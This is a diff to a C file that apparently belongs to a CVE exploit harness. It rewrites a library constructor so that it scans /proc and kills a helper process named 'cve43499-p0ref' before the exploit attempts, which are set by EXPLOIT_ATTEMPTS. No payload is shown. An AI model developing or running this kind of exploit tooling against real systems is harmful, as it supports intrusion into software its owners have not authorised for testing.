@@ -125,7 +125,33 @@ __attribute__((constructor)) static void load(void) {
   started = 1;
   set_unbuffer();
   wait_for_boot_quiet_window();
-  system("pkill -9 cve43499-p0ref 2>/dev/null");
+
+  {
+    DIR *proc = opendir("/proc");
+    if (proc) {
+      struct dirent *entry;
+      while ((entry = readdir(proc)) != NULL) {
+        if (entry->d_type != DT_DIR) continue;
+        char *end;
+        long pid = strtol(entry->d_name, &end, 10);
+        if (*end || pid <= 1) continue;
+        char comm_path[64];
+        snprintf(comm_path, sizeof(comm_path), "/proc/%ld/comm", pid);
+        char comm[32] = {0};
+        int cfd = open(comm_path, O_RDONLY);
+        if (cfd >= 0) {
+          read(cfd, comm, sizeof(comm) - 1);
+          close(cfd);
+          char *nl = strchr(comm, '\n');
+          if (nl) *nl = 0;
+          if (strcmp(comm, "cve43499-p0ref") == 0) {
+            kill((pid_t)pid, SIGKILL);
+          }
+        }
+      }
+      closedir(proc);
+    }
+  }
 
   int max_attempts = env_int(
       "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
